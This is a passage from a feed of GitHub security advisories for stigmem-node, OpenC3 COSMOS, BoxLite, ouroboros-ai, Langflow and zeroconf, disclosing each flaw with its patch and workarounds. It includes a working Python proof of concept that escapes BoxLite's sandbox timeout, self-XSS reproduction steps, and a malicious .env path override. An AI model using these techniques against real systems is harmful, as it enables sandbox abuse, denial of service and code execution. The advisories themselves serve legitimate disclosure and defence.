<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-xh5j-xjfq-qvvx">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-xh5j-xjfq-qvvx</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-xh5j-xjfq-qvvx">https://github.com/advisories/GHSA-xh5j-xjfq-qvvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xh5j-xjfq-qvvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T22:14:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node: Auth-disabled deployments may grant broad anonymous access outside loopback]]></title>
        <id>https://github.com/advisories/GHSA-fp6w-8wpg-74g5</id>
        <link href="https://github.com/advisories/GHSA-fp6w-8wpg-74g5"/>
        <updated>2026-05-29T22:13:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Stigmem nodes configured with authentication disabled could grant the anonymous identity broad read/write/federation capabilities if exposed outside a loopback-only local development environment. Impacted users are operators who intentionally disabled authentication while binding the node to a non-loopback URL.</p>
<h3 id="patches">Patches</h3>
<p>Patched in 0.9.0a2. The node now refuses unauthenticated operation outside loopback-only local development.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Before upgrading, keep authentication enabled for all non-local deployments and do not expose nodes with authentication disabled to untrusted networks.</p>
<h3 id="upgrade">Upgrade</h3>
<p>Upgrade to the patched release:</p>
<pre><code class="language-bash">pip install --upgrade --pre stigmem-node
</code></pre>
<p>If developers install through the Stigmem meta-package instead, they should use the matching extra for their deployments, for example:</p>
<pre><code class="language-bash">pip install --upgrade --pre 'stigmem[node]'
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li>Release: <a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li>Changelog: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li>Security policy and posture: <a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-fp6w-8wpg-74g5">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-fp6w-8wpg-74g5</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/CHANGELOG.md#L14-L35</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md">https://github.com/eidetic-labs/stigmem/blob/v0.9.0a2/SECURITY.md</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2">https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-fp6w-8wpg-74g5">https://github.com/advisories/GHSA-fp6w-8wpg-74g5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fp6w-8wpg-74g5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-29T22:13:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openc3] OpenC3 COSMOS is Vulnerable to Self-XSS Through the Command Sender]]></title>
        <id>https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</id>
        <link href="https://github.com/advisories/GHSA-ffq5-qpvf-xq7x"/>
        <updated>2026-05-29T21:46:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Command Sender UI uses an unsafe <code>eval()</code> function on array-like command parameters, which allows a user-supplied payload to execute in the browser when sending a command. This creates a self-XSS risk because an attacker can trigger their own script execution in the victim’s session, if allowed to influence the array parameter input, for example via phishing. If successful, an attacker may read or modify data in the authenticated browser context, including session tokens in local storage.</p>
<h3 id="details">Details</h3>
<p>The unsafe <code>eval()</code>  usage on user-supplied ARRAY parameters happens in <code>convertToValue</code> method in <a href="https://github.com/OpenC3/cosmos/blob/main/openc3-cosmos-init/plugins/packages/openc3-cosmos-tool-cmdsender/src/tools/CommandSender/CommandSender.vue">CommandSender.vue</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>   Using a drop-down form, choose any command that supports ARRAY parameters,</li>
<li>   Inside square brackets “[…]” place a JavaScript code to be executed</li>
<li>   Send command to CmdTlmServer using dedicated “Send” button </li>
<li>   Observe JavaScript code being executed in the current browser session context</li>
</ol>
<p>Below example uses <code>INST ARYCMD</code> to execute simple JavaScript code snippet <code>alert(“XSS”)</code>.
<img width="947" height="356" alt="image" src="https://github.com/user-attachments/assets/6fbdb6c9-616a-4268-bbb8-a8a1044437ad"></p>
<img width="942" height="545" alt="image" src="https://github.com/user-attachments/assets/4df24353-aea0-4aa0-adcf-b7c7e387dc83">

<h3 id="impact">Impact</h3>
<p>Local JavaScript execution in the user's browser</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-ffq5-qpvf-xq7x">https://github.com/OpenC3/cosmos/security/advisories/GHSA-ffq5-qpvf-xq7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42086">https://nvd.nist.gov/vuln/detail/CVE-2026-42086</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/openc3/PYSEC-2026-105.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/openc3/PYSEC-2026-105.yaml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2026-42086.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2026-42086.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-ffq5-qpvf-xq7x">https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffq5-qpvf-xq7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T22:22:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite] BoxLite has a Timeout Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xjhv-pp2r-6f82</id>
        <link href="https://github.com/advisories/GHSA-xjhv-pp2r-6f82"/>
        <updated>2026-05-29T21:45:57.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>BoxLite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. BoxLite allows users to configure a timeout for services running inside the virtual machine. When the timeout is triggered, BoxLite sends a signal to kill the process. However, instead of using the uncatchable SIGKILL signal, BoxLite uses the catchable SIGALRM signal. Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.</p>
<h4 id="details">Details</h4>
<ol>
<li>ExecRequest with timeout_ms arrives at Execution service</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/mod.rs</code> <strong>Function:</strong> <code>spawn_execution()</code> (line 315) <strong>Code:</strong></p>
<pre><code class="language-rust">// Step 3: Start timeout watcher (if requested)
if req.timeout_ms &gt; 0 {
    timeout::start_timeout_watcher(
        state,
        execution_id.clone(),
        std::time::Duration::from_millis(req.timeout_ms),
    );
}
</code></pre>
<p><strong>Issue:</strong> Any nonzero <code>timeout_ms</code> triggers the timeout watcher. The host expects this to kill the process after the specified duration.</p>
<ol start="2">
<li>Timeout watcher sends SIGALRM instead of SIGKILL</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/timeout.rs</code> <strong>Function:</strong> <code>start_timeout_watcher()</code> (line 13) <strong>Code:</strong></p>
<pre><code class="language-rust">pub(super) fn start_timeout_watcher(
    exec_state: ExecutionState,
    exec_id: String,
    timeout: Duration,
) {
    tokio::spawn(async move {
        tokio::time::sleep(timeout).await;

        // Kill process with SIGKILL        ← comment says SIGKILL
        use nix::sys::signal::Signal;
        if exec_state.kill(Signal::SIGALRM).await {   // ← but sends SIGALRM
            info!(execution_id = %exec_id, "killed on timeout");
        }
    });
}
</code></pre>
<p><strong>Issue:</strong> The comment on line 21 explicitly states "Kill process with SIGKILL", but line 23 sends <code>Signal::SIGALRM</code>. SIGALRM (signal 14) is the POSIX alarm signal and is catchable/ignorable; SIGKILL (signal 9) cannot be caught or ignored. This is a code error — wrong signal constant used.</p>
<ol start="3">
<li>exec_state.kill() passes the signal through unchanged</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/state.rs</code> <strong>Function:</strong> <code>kill()</code> (line 325) <strong>Code:</strong></p>
<pre><code class="language-rust">pub async fn kill(&amp;self, signal: nix::sys::signal::Signal) -&gt; bool {
    let inner = self.inner.lock().await;
    if let Some(ref handle) = inner.handle {
        handle.kill(signal).is_ok()
    } else {
        false
    }
}
</code></pre>
<p><strong>Issue:</strong> No override of the signal — the wrong signal (<code>SIGALRM</code>) is delivered directly to the process.</p>
<ol start="4">
<li>ExecHandle.kill() delivers SIGALRM to the process</li>
</ol>
<p><strong>File:</strong> <code>guest/src/service/exec/exec_handle.rs</code> <strong>Function:</strong> <code>kill()</code> (line 335) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn kill(&amp;self, signal: Signal) -&gt; BoxliteResult&lt;()&gt; {
    use nix::sys::signal::kill;
    kill(self.pid, signal).map_err(|e| {
        BoxliteError::Internal(format!(
            "Failed to send signal {} to process {}: {}",
            signal, self.pid, e
        ))
    })
}
</code></pre>
<p><strong>Issue:</strong> Sends SIGALRM (signal 14) to the process. Any process that has registered a custom SIGALRM handler (e.g., via <code>signal(SIGALRM, handler)</code>) or set SIGALRM to SIG_IGN will not be terminated.</p>
<p>As seen from the code, the developer indicated in the comments that SIGKILL should be sent to kill the timed-out process, but SIGALRM was used in the implementation, resulting in the vulnerability.</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: BoxLite Execution Timeout Bypass via SIGALRM

Reproduces the vulnerability described in:
  "Hunt Report: Exec Timeout Enforcement Bypass via SIGALRM Misuse"

Root cause:
  guest/src/service/exec/timeout.rs sends Signal::SIGALRM (signal 14,
  catchable/ignorable) instead of Signal::SIGKILL (signal 9, uncatchable).

Exploitation:
  Any process that calls signal(SIGALRM, SIG_IGN) will survive past its
  configured timeout and run indefinitely.

Usage:
  cd ~/Downloads/boxlite_poc
  source .venv/bin/activate
  python3 poc_sigalrm_bypass.py
"""

import asyncio
import time

import boxlite

# -----------------------------------------------------------------------------
# Test programs (Python, so no gcc required)
# -----------------------------------------------------------------------------

# Control: no special signal handling — SIGALRM's default action is termination
NORMAL_PROCESS = """
import sys, time, os, signal
seconds = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8
print(f"PID {os.getpid()}: normal process (default SIGALRM), running for {seconds}s", flush=True)
for i in range(1, seconds + 1):
    time.sleep(1)
    print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
print(f"PID {os.getpid()}: finished", flush=True)
"""

# Exploit: installs SIG_IGN for SIGALRM — one line bypass
IGNORE_SIGALRM = """
import sys, time, os, signal
seconds = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8
signal.signal(signal.SIGALRM, signal.SIG_IGN)   # &lt;-- bypass
print(f"PID {os.getpid()}: SIGALRM=SIG_IGN, running for {seconds}s", flush=True)
for i in range(1, seconds + 1):
    time.sleep(1)
    if i &gt; 3:
        print(f"PID {os.getpid()}: t+{i}s STILL ALIVE (PAST 3s TIMEOUT!)", flush=True)
    else:
        print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
print(f"PID {os.getpid()}: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED", flush=True)
"""

TIMEOUT_S = 3.0   # configured timeout
WORKLOAD_S = 8    # process wants to run for 8 seconds


# -----------------------------------------------------------------------------
# Helper
# -----------------------------------------------------------------------------

async def run_test(box, name, script, timeout):
    print(f"\n{'=' * 70}")
    print(f"TEST: {name}")
    print(f"  timeout={timeout}s" if timeout else "  timeout=None (disabled)")
    print(f"{'=' * 70}")
    t0 = time.time()
    try:
        result = await box.exec("python3", "-c", script, str(WORKLOAD_S), timeout=timeout)
        elapsed = time.time() - t0
        print(f"  [RESULT] exit_code={result.exit_code}, elapsed={elapsed:.2f}s")
        print("  [OUTPUT]")
        for line in result.stdout.strip().splitlines():
            if line.strip():
                print(f"    {line}")
        return {
            "elapsed": elapsed,
            "exit_code": result.exit_code,
            "timed_out": False,
            "stdout": result.stdout,
        }
    except boxlite.TimeoutError as e:
        elapsed = time.time() - t0
        print(f"  [TIMEOUT] BoxLite raised TimeoutError after {elapsed:.2f}s: {e}")
        return {"elapsed": elapsed, "exit_code": None, "timed_out": True, "stdout": ""}
    except Exception as e:
        elapsed = time.time() - t0
        print(f"  [ERROR] {type(e).__name__}: {e} (elapsed {elapsed:.2f}s)")
        return {"elapsed": elapsed, "exit_code": None, "timed_out": False, "stdout": ""}


# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

async def main():
    print("BoxLite PoC: Execution Timeout Bypass via SIGALRM")
    print("=" * 70)

    async with boxlite.SimpleBox(image="python:3-alpine") as box:
        print(f"Box started: {box.id}")

        # Confirm SIGALRM = 14 inside the container
        r = await box.exec("python3", "-c", "import signal; print(signal.SIGALRM)")
        print(f"SIGALRM value inside container: {r.stdout.strip()}")

        # --- Test 1: CONTROL ---
        r1 = await run_test(
            box,
            "CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)",
            NORMAL_PROCESS,
            TIMEOUT_S,
        )
        await asyncio.sleep(1)

        # --- Test 2: EXPLOIT ---
        r2 = await run_test(
            box,
            "EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)",
            IGNORE_SIGALRM,
            TIMEOUT_S,
        )
        await asyncio.sleep(1)

        # --- Test 3: BASELINE ---
        r3 = await run_test(
            box,
            "BASELINE: Normal process, no timeout (sanity check)",
            NORMAL_PROCESS,
            None,
        )

        # --- Verdict ---
        print(f"\n{'=' * 70}")
        print("VERDICT")
        print(f"{'=' * 70}")
        print(f"  CONTROL:  elapsed={r1['elapsed']:.2f}s  exit_code={r1['exit_code']}  timed_out={r1['timed_out']}")
        print(f"  EXPLOIT:  elapsed={r2['elapsed']:.2f}s  exit_code={r2['exit_code']}  timed_out={r2['timed_out']}")
        print(f"  BASELINE: elapsed={r3['elapsed']:.2f}s  exit_code={r3['exit_code']}  timed_out={r3['timed_out']}")

        # exit_code == -14 means killed by signal 14 (SIGALRM), not -9 (SIGKILL)
        control_killed_by_sigalrm = r1["exit_code"] == -14 and r1["elapsed"] &lt; 5.0
        exploit_survived          = r2["elapsed"] &gt; 5.0 and r2["exit_code"] == 0

        print()
        if control_killed_by_sigalrm:
            print("  [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)")
            print("      → confirms timeout watcher sends SIGALRM instead of SIGKILL")
        if exploit_survived:
            print(f"  [+] Exploit process ran {r2['elapsed']:.1f}s past {TIMEOUT_S}s timeout, exited normally")
            print("      → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed")

        if exploit_survived and control_killed_by_sigalrm:
            print()
            print("  *** VULNERABILITY CONFIRMED ***")
            print(f"  Fix: change Signal::SIGALRM → Signal::SIGKILL in")
            print(f"       guest/src/service/exec/timeout.rs")
        elif not exploit_survived:
            print("  NOT CONFIRMED: exploit process was also terminated at timeout")
        else:
            print("  INCONCLUSIVE")


if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>Sample output:</p>
<pre><code>$ python3 poc_sigalrm_bypass.py
BoxLite PoC: Execution Timeout Bypass via SIGALRM
======================================================================
Box started: W0oCKYIWga2t
SIGALRM value inside container: 14

======================================================================
TEST: CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)
  timeout=3.0s
======================================================================
  [RESULT] exit_code=-14, elapsed=3.01s
  [OUTPUT]
    PID 3: normal process (default SIGALRM), running for 8s
    PID 3: t+1s alive
    PID 3: t+2s alive

======================================================================
TEST: EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)
  timeout=3.0s
======================================================================
  [RESULT] exit_code=0, elapsed=8.14s
  [OUTPUT]
    PID 4: SIGALRM=SIG_IGN, running for 8s
    PID 4: t+1s alive
    PID 4: t+2s alive
    PID 4: t+3s alive
    PID 4: t+4s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+5s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+6s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+7s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: t+8s STILL ALIVE (PAST 3s TIMEOUT!)
    PID 4: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED

======================================================================
TEST: BASELINE: Normal process, no timeout (sanity check)
  timeout=None (disabled)
======================================================================
  [RESULT] exit_code=0, elapsed=8.09s
  [OUTPUT]
    PID 5: normal process (default SIGALRM), running for 8s
    PID 5: t+1s alive
    PID 5: t+2s alive
    PID 5: t+3s alive
    PID 5: t+4s alive
    PID 5: t+5s alive
    PID 5: t+6s alive
    PID 5: t+7s alive
    PID 5: t+8s alive
    PID 5: finished

======================================================================
VERDICT
======================================================================
  CONTROL:  elapsed=3.01s  exit_code=-14  timed_out=False
  EXPLOIT:  elapsed=8.14s  exit_code=0  timed_out=False
  BASELINE: elapsed=8.09s  exit_code=0  timed_out=False

  [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)
      → confirms timeout watcher sends SIGALRM instead of SIGKILL
  [+] Exploit process ran 8.1s past 3.0s timeout, exited normally
      → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed

  *** VULNERABILITY CONFIRMED ***
  Fix: change Signal::SIGALRM → Signal::SIGKILL in
       guest/src/service/exec/timeout.rs
</code></pre>
<p>As shown in the output, after catching the SIGALRM signal, the process can continue running, bypassing the timeout restriction.</p>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.</p>
<h4 id="score">Score</h4>
<p>Severity: Medium, Score: 6.5, rationale as follows:</p>
<ul>
<li>AV:N — Can be triggered by submitting code via the network API</li>
<li>AC:L — No complex exploitation required; catching the signal is sufficient to bypass</li>
<li>PR:L — The attacker does not need special privileges</li>
<li>UI:N — The attacker does not need to interact with the victim</li>
<li>S:U — This vulnerability only affects the sandbox internals and does not change the scope</li>
<li>C:N/I:N/A:H — This vulnerability only affects availability, not confidentiality or integrity</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>CVE and credit are preferred.</p>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to Tencent Xuanwu Lab for further discussion by emailing <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that the organization follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that the organization reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-xjhv-pp2r-6f82">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-xjhv-pp2r-6f82</a></li>
<li><a href="https://github.com/advisories/GHSA-xjhv-pp2r-6f82">https://github.com/advisories/GHSA-xjhv-pp2r-6f82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xjhv-pp2r-6f82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T21:45:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ouroboros-ai] ouroboros-ai Vulnerable to Remote Code Execution via Untrusted Project-Directory .env]]></title>
        <id>https://github.com/advisories/GHSA-c4m7-2gwp-vw76</id>
        <link href="https://github.com/advisories/GHSA-c4m7-2gwp-vw76"/>
        <updated>2026-05-29T21:22:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Remote Code Execution (RCE) vulnerability was discovered in Ouroboros. If a user clones a malicious repository and runs Ouroboros commands within that directory, it can lead to arbitrary code execution and potential system takeover.</p>
<p>The vulnerability (CWE-426: Untrusted Search Path &amp; CWE-15: External Control of System Setting) stems from Ouroboros loading the <code>.env</code> file from the current working directory. Prior to the patch, execution-affecting environment variables such as <code>OUROBOROS_CLI_PATH</code>, <code>OPENCODE_CLI_PATH</code>, and other backend selectors were accepted directly from this local <code>.env</code>. An attacker could include a malicious script in the repository and point the CLI path variable to it (e.g., <code>OUROBOROS_CLI_PATH=./malicious_script.sh</code>). When the user executes a command like <code>ouroboros init</code> or any command that instantiates the adapter, the malicious script is executed instead of the intended CLI.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 0.39.0 via PR #1078.
The fix establishes a strict trust boundary by applying a denylist to project-local <code>.env</code> loading. It blocks execution-affecting environment variables (such as runtime selectors and CLI path overrides) from being loaded from the project directory. Explicit constructor overrides and trusted user-owned home configurations (<code>~/.ouroboros/.env</code>) remain fully functional. </p>
<p>Users are strongly advised to upgrade to version 0.39.0 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, users must carefully inspect any <code>.env</code> file inside cloned repositories before running Ouroboros commands to ensure it does not contain unexpected <code>OUROBOROS_*_CLI_PATH</code> or <code>OPENCODE_CLI_PATH</code> overrides.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub PR: <a href="https://github.com/Q00/ouroboros/pull/1078">https://github.com/Q00/ouroboros/pull/1078</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Q00/ouroboros/security/advisories/GHSA-c4m7-2gwp-vw76">https://github.com/Q00/ouroboros/security/advisories/GHSA-c4m7-2gwp-vw76</a></li>
<li><a href="https://github.com/Q00/ouroboros/pull/1078">https://github.com/Q00/ouroboros/pull/1078</a></li>
<li><a href="https://github.com/Q00/ouroboros/commit/4e70b760b4eb157469b58645339ba831f6513d37">https://github.com/Q00/ouroboros/commit/4e70b760b4eb157469b58645339ba831f6513d37</a></li>
<li><a href="https://github.com/advisories/GHSA-c4m7-2gwp-vw76">https://github.com/advisories/GHSA-c4m7-2gwp-vw76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c4m7-2gwp-vw76</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T21:22:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow CORS misconfiguration enables Account Takeover and RCE]]></title>
        <id>https://github.com/advisories/GHSA-577h-p2hh-v4mv</id>
        <link href="https://github.com/advisories/GHSA-577h-p2hh-v4mv"/>
        <updated>2026-05-29T20:51:09.000Z</updated>
        <content type="html"><![CDATA[<p>Langflow versions up to and including 1.6.9 contain a chained vulnerability that enables account takeover and remote code execution. An overly permissive CORS configuration (allow_origins='*' with allow_credentials=True) combined with a refresh token cookie configured as SameSite=None allows a malicious webpage to perform cross-origin requests that include credentials and successfully call the refresh endpoint. An attacker-controlled origin can therefore obtain fresh access_token / refresh_token pairs for a victim session. Obtained tokens permit access to authenticated endpoints — including built-in code-execution functionality — allowing the attacker to execute arbitrary code and achieve full system compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-34291">https://nvd.nist.gov/vuln/detail/CVE-2025-34291</a></li>
<li><a href="https://github.com/langflow-ai/langflow">https://github.com/langflow-ai/langflow</a></li>
<li><a href="https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform">https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform</a></li>
<li><a href="https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce">https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10139">https://github.com/langflow-ai/langflow/pull/10139</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10696">https://github.com/langflow-ai/langflow/pull/10696</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/9240">https://github.com/langflow-ai/langflow/pull/9240</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/9441">https://github.com/langflow-ai/langflow/pull/9441</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2025-78.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2025-78.yaml</a></li>
<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-34291">https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-34291</a></li>
<li><a href="https://www.crowdsec.net/vulntracking-report/cve-2025-34291">https://www.crowdsec.net/vulntracking-report/cve-2025-34291</a></li>
<li><a href="https://github.com/advisories/GHSA-577h-p2hh-v4mv">https://github.com/advisories/GHSA-577h-p2hh-v4mv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-577h-p2hh-v4mv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-12-06T00:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf has unbounded DNS record cache that allows LAN-local memory exhaustion via multicast flood]]></title>
        <id>https://github.com/advisories/GHSA-rfg2-pjw2-56x2</id>
        <link href="https://github.com/advisories/GHSA-rfg2-pjw2-56x2"/>
        <updated>2026-05-29T20:18:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSCache._async_add</code> inserted every response record into <code>cache</code>, <code>_expirations</code>, <code>_expire_heap</code>, and <code>service_cache</code> with no cap on entry count. The only pre-existing protection was a PTR TTL floor (<code>_DNS_PTR_MIN_TTL = 1125</code> s, RFC 6762 §10), which actually <em>prolonged</em> attacker-injected records, and a periodic <code>async_expire</code> on <code>_CACHE_CLEANUP_INTERVAL = 10</code> s that could not keep up with a flood.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can multicast valid mDNS responses with unique names (RFC 6762 §11 allows up to 253 bytes each) and watch them accumulate. On memory-constrained deployments (Home Assistant on Raspberry-Pi-class hardware is the canonical victim) sustained traffic OOM-kills the process; under lighter load, every cache lookup and every periodic expiry pass grows linearly slower, starving asyncio and breaking unrelated zeroconf consumers (discovery, registration, ServiceBrowser callbacks). A second variant — re-multicasting cached records with shifting TTLs — grows <code>_expire_heap</code> unbounded between cleanup runs without touching <code>cache</code> or <code>_total_records</code>.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.6 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">PR #1718</a>). Upgrade to <code>&gt;= 0.149.6</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1718">PR #1718</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1715">Issue #1715</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc6762#section-10">RFC 6762 §10</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762#section-11">RFC 6762 §11</a>, <a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-rfg2-pjw2-56x2">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-rfg2-pjw2-56x2</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1715">https://github.com/python-zeroconf/python-zeroconf/issues/1715</a></li>
